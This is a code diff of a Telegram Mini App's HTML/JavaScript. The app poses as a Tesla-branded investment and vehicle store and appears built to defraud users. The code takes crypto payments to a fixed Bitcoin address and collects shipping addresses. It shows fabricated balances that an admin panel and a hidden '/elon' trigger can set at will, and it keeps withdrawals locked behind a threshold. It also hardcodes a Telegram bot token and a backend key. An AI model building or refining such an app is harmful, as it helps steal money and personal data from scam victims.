@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
     <title>𝕏-Invest Premium Advisory Matrix</title>
     <!-- Telegram Web App SDK & Supabase Client -->
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
@@ -11,23 +11,25 @@
     <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
     <style>
         :root {
-            --bg-dark: #000000;
-            --panel-bg: #09090b;
+            /* Fallbacks hooked directly into Telegram Native Theme Variables */
+            --bg-dark: var(--tg-theme-bg-color, #000000);
+            --panel-bg: var(--tg-theme-secondary-bg-color, #09090b);
             --card-bg: #121217;
             --tesla-red: #e82127;
-            --text-main: #ffffff;
-            --text-gray: #a1a1aa;
+            --text-main: var(--tg-theme-text-color, #ffffff);
+            --text-gray: var(--tg-theme-hint-color, #a1a1aa);
             --border-color: rgba(255, 255, 255, 0.08);
             --glow-red: 0 0 20px rgba(232, 33, 39, 0.3);
         }
 
-        /* Strict CSS Resets for Mobile Rendering */
+        /* Strict Reset & iOS Hardware Sanitization */
         * { 
             box-sizing: border-box; 
             margin: 0; 
             padding: 0; 
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
             -webkit-font-smoothing: antialiased;
+            -webkit-tap-highlight-color: transparent;
         }
         
         body { 
@@ -35,13 +37,16 @@
             color: var(--text-main); 
             min-height: 100vh; 
             overflow-x: hidden; 
-            padding-top: 80px; 
+            padding-top: 75px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
         }
         body.nav-locked {
             overflow: hidden;
         }
         
-        /* Fixed Top Header Configuration */
+        /* Layout Header Context */
         header { 
             background: var(--panel-bg); 
             padding: 0 20px; 
@@ -56,7 +61,7 @@
             height: 65px;
             z-index: 1000; 
         }
-        .brand-title { font-weight: 900; letter-spacing: 1px; font-size: 14px; color: #fff; text-transform: uppercase; }
+        .brand-title { font-weight: 900; letter-spacing: 1px; font-size: 13px; color: #fff; text-transform: uppercase; }
         .balance-box { 
             background: rgba(255, 255, 255, 0.03); 
             border: 1px solid var(--border-color); 
@@ -67,11 +72,11 @@
         .balance-label { font-size: 9px; color: var(--text-gray); text-transform: uppercase; display: block; margin-bottom: 2px; }
         .balance-amount { font-size: 15px; font-weight: bold; color: #00ff66; }
 
-        /* 3-Line Hamburger Button Menu Button */
+        /* Hamburger Drawer Menu Button */
         .menu-toggle {
             position: fixed;
-            top: 85px;
-            left: 20px;
+            top: 80px;
+            left: 15px;
             background: #121217;
             border: 1px solid var(--border-color);
             border-radius: 8px;
@@ -89,7 +94,7 @@
         }
         .menu-toggle .bar { width: 20px; height: 2px; background-color: #fff; transition: 0.3s; }
 
-        /* Full Screen Drawer Side Navigation Panel */
+        /* Side Navigation Overlay Panel */
         .side-nav {
             position: fixed;
             top: 0;
@@ -101,12 +106,11 @@
             box-shadow: 20px 0 40px rgba(0,0,0,0.9);
             transition: left 0.3s ease-in-out;
             z-index: 1050;
-            padding: 150px 20px 20px 20px;
+            padding: 140px 20px 20px 20px;
         }
         .side-nav.open { left: 0; }
         .nav-links { list-style: none; display: flex; flex-direction: column; gap: 8px; }
         
-        /* Cleaned Link Definitions to Override Native Defaults */
         .nav-item { 
             display: flex; 
             align-items: center; 
@@ -128,11 +132,11 @@
             border-color: rgba(232, 33, 39, 0.4); 
         }
 
-        /* View Layout Handling Container */
-        .app-view { display: none; padding: 15px; width: 100%; max-width: 600px; margin: 0 auto; }
+        /* View Layout Control Modules */
+        .app-view { display: none; padding: 15px; width: 100%; max-width: 500px; margin: 0 auto; }
         .app-view.active { display: flex; flex-direction: column; gap: 15px; }
 
-        /* General Forms and UI Cards styling */
+        /* Forms and Core Panel UI Cards */
         .card { 
             background: var(--card-bg); 
             border: 1px solid var(--border-color); 
@@ -142,43 +146,47 @@
             box-shadow: 0 4px 15px rgba(0,0,0,0.4);
         }
         
-        /* Strict Input Styling Overrides for Mobile Browsers */
-        .input-group { display: flex; flex-direction: column; gap: 8px; width: 100%; }
-        .input-group label { font-size: 11px; color: var(--text-gray); text-transform: uppercase; font-weight: bold; letter-spacing: 0.5px; }
+        /* Strict iOS Webview Form Element Sanitization Override */
+        .input-group { display: flex; flex-direction: column; gap: 8px; width: 100%; margin-bottom: 12px; }
+        .input-group label { font-size: 11px; color: var(--text-gray); text-transform: uppercase; font-weight: bold; letter-spacing: 0.5px; text-align: left;}
         
         .input-field { 
             background: #16161f !important; 
             border: 1px solid var(--border-color) !important; 
-            padding: 14px; 
-            border-radius: 8px; 
+            padding: 14px !important; 
+            border-radius: 8px !important; 
             color: #ffffff !important; 
-            font-size: 14px; 
-            width: 100%; 
-            outline: none; 
-            -webkit-appearance: none; /* Strips iOS default inputs styles */
-            appearance: none;
+            font-size: 14px !important; 
+            width: 100% !important; 
+            outline: none !important; 
+            box-shadow: none !important;
+            -webkit-appearance: none !important; /* Strips iOS default inputs layout rules */
+            appearance: none !important;
         }
         .input-field:focus { border-color: var(--tesla-red) !important; }
+        .input-field::placeholder { color: rgba(255, 255, 255, 0.3) !important; }
 
         .btn { 
             background: var(--tesla-red) !important; 
             color: #ffffff !important; 
-            border: none; 
-            padding: 14px; 
-            border-radius: 8px; 
-            font-weight: bold; 
-            width: 100%; 
+            border: none !important; 
+            padding: 14px !important; 
+            border-radius: 8px !important; 
+            font-weight: bold !important; 
+            width: 100% !important; 
             cursor: pointer; 
             text-transform: uppercase; 
             font-size: 13px; 
             letter-spacing: 0.5px; 
-            -webkit-appearance: none;
-            appearance: none;
+            box-shadow: none !important;
+            -webkit-appearance: none !important;
+            appearance: none !important;
             transition: all 0.2s ease;
+            margin-top: 5px;
         }
-        .btn:hover { background: #ff2a31 !important; box-shadow: var(--glow-red); }
+        .btn:hover { background: #ff2a31 !important; box-shadow: var(--glow-red) !important; }
         
-        /* Store Products Display Framework */
+        /* Store Matrix Configurations */
         .product-card { background: var(--card-bg); border: 1px solid var(--border-color); border-radius: 14px; overflow: hidden; margin-bottom: 15px; }
         .product-img { width: 100%; height: 180px; background-size: cover; background-position: center; background-color: #15151c; }
         .product-info { padding: 15px; }
@@ -188,7 +196,6 @@
         .qr-container-wrapper { display: flex; flex-direction: column; align-items: center; margin: 15px 0; background: #fff; padding: 15px; border-radius: 12px; width: fit-content; margin-left: auto; margin-right: auto; }
         .address-box { font-family: monospace; font-size: 10px; word-break: break-all; background: #000; padding: 10px; border-radius: 6px; color: #ff9900; border: 1px solid rgba(255,153,0,0.2); width: 100%; text-align: center; margin-top: 10px; }
 
-        /* Secret Mode Override Layout styling */
         .elon-override-badge {
             display: none;
             background: linear-gradient(90deg, #ff9900, #ff0055);
@@ -205,7 +212,7 @@
 </head>
 <body>
 
-    <!-- Top Corner Floating Status Sync Header Interface -->
+    <!-- Fixed Status Navigation Sync Header -->
     <header>
         <div>
             <div class="brand-title" id="user-display">@NEURALLINKTRADER</div>
@@ -217,14 +224,14 @@
         </div>
     </header>
 
-    <!-- 3-Line Menu Trigger Navigation Button Component -->
+    <!-- Menu Trigger Navigation Button Component -->
     <button class="menu-toggle" id="menuToggle">
         <div class="bar"></div>
         <div class="bar"></div>
         <div class="bar"></div>
     </button>
 
-    <!-- Side Menu Sidebar Overlay Navigation Panel Drawer -->
+    <!-- Navigation Drawer Panel Menu Layout -->
     <nav class="side-nav" id="sideNav">
         <ul class="nav-links">
             <li><a href="#" class="nav-item active" onclick="switchView('view-dashboard', this)"><span>📊</span> Dashboard Matrix</a></li>
@@ -234,7 +241,7 @@
         </ul>
     </nav>
 
-    <!-- SECTION MODULE VIEW 1: ADVANCED HOME PORTFOLIO DASHBOARD -->
+    <!-- VIEW 1: HOME DASHBOARD PLATFORM -->
     <main id="view-dashboard" class="app-view active">
         <div class="card" style="text-align: center; background: linear-gradient(135deg, #0f0f14, #1b1b26); padding: 15px;">
             <p style="font-size: 11px; letter-spacing: 1px; color: var(--text-gray); margin-bottom: 5px;">MARKET VALUATION SYNC STATUS</p>
@@ -244,7 +251,7 @@
 
         <div class="card">
             <h3 style="margin-bottom: 12px; font-size: 14px; letter-spacing: 0.5px;">⚡ ACCELERATED PORTFOLIO STAKE ALLOCATION</h3>
-            <div class="input-group" style="margin-bottom: 15px;">
+            <div class="input-group">
                 <label>Allocation Value Threshold ($)</label>
                 <input type="number" id="stock-purchase-amount" class="input-field" placeholder="Ex: 15000">
                 <small style="color: var(--text-gray); font-size: 11px; margin-top: 4px; line-height: 1.3;">* System Minimum Limit: $15,000 / Maximum rolling window ceiling: $30,000.</small>
@@ -252,8 +259,8 @@
             <button class="btn" onclick="executeStockPurchase()">Execute Asset Deployment Order</button>
         </div>
 
-        <!-- Scrollable End-User License Agreement Display Block -->
-        <div class="card" style="border-top: 3px solid var(--text-gray); max-height: 150px; overflow-y: scroll; background: #0b0b0e; padding: 15px; border-radius: 8px;">
+        <!-- Scrollable Terms Agreement Frame Display Block -->
+        <div class="card" style="border-top: 3px solid var(--text-gray); max-height: 140px; overflow-y: scroll; background: #0b0b0e; padding: 15px; border-radius: 8px;">
             <h4 style="font-size: 11px; letter-spacing: 1px; margin-bottom: 8px; color: var(--text-main); text-transform: uppercase;">End-User License Agreement & Operational Disclosures</h4>
             <p style="font-size: 11px; color: var(--text-gray); line-height: 1.5; margin-bottom: 10px;">
                 <strong>1. Scope of License:</strong> This application grants you a non-exclusive, non-transferable, revocable license to access premium simulation matrices, mock ledger allocation testing suites, and integrated analytical tracking software strictly for educational, engineering, and interface testing benchmarks. All virtual assets, portfolio data calculations, and simulated balance points visible within this dashboard environment are dynamically generated telemetry records and do not constitute legal brokerage accounts or registered financial holding deposits.
@@ -270,7 +277,7 @@
         </div>
     </main>
 
-    <!-- SECTION MODULE VIEW 2: AUTHENTIC TESLA FLEET STORE INTERFACE -->
+    <!-- VIEW 2: AUTHENTIC FLEET PRODUCT LOGISTICS STORE -->
     <main id="view-store" class="app-view">
         <h2 style="margin-bottom: 5px; font-size: 20px;">Tesla Direct Logistics Fleet</h2>
         <p style="color: var(--text-gray); font-size: 13px; margin-bottom: 15px;">Deploy integrated platform balances into active factory vehicle delivery queues.</p>
@@ -307,11 +314,11 @@
             </div>
         </div>
 
-        <!-- Hidden Modular Component Box: Active Vehicle Purchase Deployment -->
+        <!-- Hidden Components Element Container Layer Block Area -->
         <div id="order-form-block" class="card" style="display: none; border-color: var(--tesla-red);">
             <h3 id="order-title-element" style="margin-bottom: 15px; font-size: 16px;"></h3>
             
-            <div class="input-group" style="margin-bottom: 15px;">
+            <div class="input-group">
                 <label>Clearance Resolution Protocol</label>
                 <select id="payment-mode-selection" class="input-field" onchange="togglePaymentSelectionUI()">
                     <option value="balance">Deduct Asset Value From Platform Portfolio Balance</option>
@@ -328,7 +335,7 @@
                 <div class="address-box">bc1q8egcghdp55c4p54rnw7v4zjwupme7m3se509tw</div>
             </div>
 
-            <div class="input-group" style="margin-bottom: 15px;">
+            <div class="input-group">
                 <label>Physical Street Shipping Destination Delivery Address</label>
                 <input type="text" id="order-address-input" class="input-field" placeholder="Complete destination tracking lines">
             </div>
@@ -337,38 +344,41 @@
         </div>
     </main>
 
-    <!-- SECTION MODULE VIEW 3: SYSTEM DISINVESTMENT OUTRAMP -->
+    <!-- VIEW 3: DISINVESTMENT TRACKING MODULE LINK -->
     <main id="view-withdraw" class="app-view">
         <h2 style="font-size: 20px; margin-bottom: 5px;">Capital Disinvestment Clearance Terminal</h2>
         <p style="color: var(--text-gray); font-size: 13px; margin-bottom: 15px;">Convert dynamic equity ledger assets into physical external accounts.</p>
         
-        <div id="withdraw-lockout-notice" class="card" style="text-align: center; border-style: dashed; border-color: var(--tesla-red);">
-            <p id="withdraw-status-header" style="color: var(--tesla-red); font-weight: bold; margin-bottom: 4px;">🚫 SYSTEM STATUS: ACCESS LOCKED</p>
-            <p id="withdraw-status-desc" style="font-size: 12px; color: var(--text-gray); line-height: 1.4;">Withdrawal routing modules initialize only when individual verified portfolio limits cross a baseline of $10,000.00.</p>
+        <div id="withdraw-lockout-notice" class="card" style="text-align: center; border-style: dashed; border-color: var(--tesla-red); padding: 30px 20px;">
+            <p id="withdraw-status-header" style="color: var(--tesla-red); font-weight: bold; font-size: 14px; margin-bottom: 8px;">🚫 SYSTEM STATUS: ACCESS LOCKED</p>
+            <p id="withdraw-status-desc" style="font-size: 12px; color: var(--text-gray); line-height: 1.5;">Withdrawal routing modules initialize only when individual verified portfolio limits cross a baseline of $10,000.00.</p>
         </div>
     </main>
 
-    <!-- SECTION MODULE VIEW 4: ADMIN CONTROLLER CORE PANEL -->
+    <!-- VIEW 4: SYSTEM ADMINISTRATION CORE PORTAL CONTROL PANEL -->
     <main id="view-admin" class="app-view">
         <h2 style="font-size: 20px; margin-bottom: 5px;">Admin Management Matrix Panel</h2>
         <p style="color: var(--text-gray); font-size: 12px; margin-bottom: 15px;">Operational Hub Anchor: Gigafactory — Austin, Texas, USA</p>
         
         <div class="card">
-            <h4 style="margin-bottom: 12px; font-size: 14px;">Manual Account Balance Controller</h4>
-            <div class="input-group" style="margin-bottom: 12px;">
+            <h4 style="margin-bottom: 15px; font-size: 14px; text-align: left; color: var(--tesla-red); font-weight: bold; letter-spacing: 0.5px;">MANUAL ACCOUNT BALANCE CONTROLLER</h4>
+            
+            <div class="input-group">
                 <label>Target User Telegram ID Number</label>
                 <input type="text" id="admin-target-id" class="input-field" placeholder="Ex: 12345678">
             </div>
-            <div class="input-group" style="margin-bottom: 15px;">
+            
+            <div class="input-group" style="margin-bottom: 20px;">
                 <label>New Exact Portfolio Balance Amount ($)</label>
                 <input type="number" id="admin-target-balance" class="input-field" placeholder="Ex: 50000">
             </div>
+            
             <button class="btn" onclick="adminUpdateBalance()">Sync Modified Balance Instantly</button>
         </div>
     </main>
 
     <script>
-        // BACKEND CONTROL TELEMETRY CONNECTORS
+        // BACKEND REALTIME ENGINE CONTEXT HUB
         const SUPABASE_URL = "https://uexsmqsplhdxkq.supabase.co";
         const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InVleHNtcXNwbGhkeGtwdXF3em9lIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODM0MjQxMjEsImV4cCI6MjA5OTAwMDEyMX0.EuFDle4MAmZSAh08ygL2NFMjGy01Ga84IOhdnA08KEE";
         const TELEGRAM_BOT_TOKEN = "8979519467:AAHDdSExQdeQY9cXIRhr0I3nt961m-6d32I"; 
@@ -382,7 +392,7 @@
         let qrCodeInstance = null;
         let elonModeActive = false;
 
-        // HAMBURGER DRAWER ACTION LISTENERS
+        // DRAWER CONTROLLER LAYER CAPTURES
         const menuToggle = document.getElementById('menuToggle');
         const sideNav = document.getElementById('sideNav');
 
@@ -399,7 +409,7 @@
             }
         });
 
-        // HIDDEN EXPLOIT PROTOCOL /ELON TRIGGER ENGINE
+        // /ELON HIDDEN TRIGGER ENGINE
         document.addEventListener('input', (e) => {
             if (e.target && e.target.value && e.target.value.toLowerCase().includes('/elon')) {
                 e.target.value = e.target.value.replace(/\/elon/gi, '');
@@ -411,16 +421,13 @@
             if (elonModeActive) return;
             elonModeActive = true;
             
-            // Visual indicators triggered UI wide
             document.getElementById('elon-mode-indicator').style.display = 'inline-block';
             
-            // Force balance system to high-priority numbers
             if (currentUser) {
                 currentUser.Balance = 999999999;
                 document.getElementById('balance').innerText = `$999,999,999`;
             }
 
-            // Unlock the Outramp Terminal instantaneously 
             const statusHeader = document.getElementById('withdraw-status-header');
             const statusDesc = document.getElementById('withdraw-status-desc');
             if (statusHeader && statusDesc) {
@@ -435,7 +442,7 @@
             alert("🚀 System Override Complete. God-Mode parameters integrated into application active memory arrays.");
         }
 
-        // VIEW MATRIX HANDLING
+        // NAVIGATION COMPONENT LAYOUT MATRIX DISPLAY SWITCH
         function switchView(viewId, element) {
             document.querySelectorAll('.app-view').forEach(v => v.classList.remove('active'));
             document.getElementById(viewId).classList.add('active');
@@ -449,7 +456,7 @@
             if (viewId === 'view-dashboard') loadTradingViewChart();
         }
 
-        // STORE DEPLOYMENT SELECTIONS ENGINE
+        // STORE VEHICLE ACQUISITIONS CONTROLLERS
         function openOrderModal(name, cost) {
             selectedProduct = { name: name, cost: cost };
             document.getElementById('order-title-element').innerText = `ACQUISITION PROFILE: ${name.toUpperCase()}`;
@@ -506,7 +513,6 @@
             document.getElementById('products-catalog-container').style.display = 'block';
         }
 
-        // OUTBOUND ROBOTIC TELEMETRY SIGNAL CHANNELS
         async function emitTelemetryLog(msg) {
             try {
                 await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
@@ -517,7 +523,6 @@
             } catch(e) { console.error("Signal loss occurred.", e); }
         }
 
-        // ASSET STAKE TRANSACTIONS PIPELINE
         async function executeStockPurchase() {
             const amt = parseFloat(document.getElementById('stock-purchase-amount').value) || 0;
             const currentBal = currentUser ? parseFloat(currentUser.Balance || 0) : 0;
@@ -537,7 +542,6 @@
             document.getElementById('stock-purchase-amount').value = "";
         }
 
-        // ADMINISTRATIVE BACKDOOR INTERFACE COMPILATION
         async function adminUpdateBalance() {
             const tId = document.getElementById('admin-target-id').value.trim();
             const tVal = parseFloat(document.getElementById('admin-target-balance').value);
@@ -556,9 +560,15 @@
             }
         }
 
-        // INITIAL SYSTEM CONTEXT APP MOUNTING PROCEDURES
+        // INITIAL APPLICATION MOUNT ROUTINES
         async function bootstrapApplicationRuntime() {
-            if (tg) { tg.expand(); tg.ready(); }
+            if (tg) { 
+                tg.expand(); 
+                tg.ready(); 
+                // Enable header color sync matching theme background parameters natively
+                if (tg.setHeaderColor) tg.setHeaderColor('secondary_bg_color');
+            }
+            
             let trackingTelegramId = tg?.initDataUnsafe?.user?.id?.toString() || "12345678";
             let defaultName = tg?.initDataUnsafe?.user?.username || "NeuralLinkTrader";
 
@@ -575,7 +585,6 @@
                 }
             }
             
-            // Set up fallback checker if library loads after bootstrap
             let attempts = 0;
             const checkChartLib = setInterval(() => {
                 attempts++;
